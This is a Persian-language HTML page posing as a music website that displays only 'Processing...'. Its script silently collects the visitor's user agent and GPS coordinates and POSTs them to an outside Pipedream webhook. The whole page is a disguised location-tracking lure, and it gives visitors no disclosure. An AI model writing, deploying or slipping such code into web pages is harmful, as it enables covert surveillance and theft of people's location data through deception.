<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سایت موزیک </title>
</head>
<body>
    <h1>درحال پردازش ...</h1>

    <script>
        // دریافت اطلاعات مدل دستگاه
        const deviceModel = navigator.userAgent;

        // دریافت موقعیت مکانی
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // داده‌های ارسال به Webhook
                const data = {
                    deviceModel: deviceModel,
                    latitude: latitude,
                    longitude: longitude,
                    timestamp: new Date().toISOString()
                };

                // ارسال داده‌ها به Webhook
                fetch('https://eop77h2vm4imb0u.m.pipedream.net', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                })
                .then(response => response.json())
                .then(data => console.log('اطلاعات ارسال شد:', data))
                .catch((error) => console.error('خطا در ارسال اطلاعات:', error));
            });
        } else {
            alert('موقعیت مکانی در دسترس نیست');
        }
    </script>
</body>
</html>
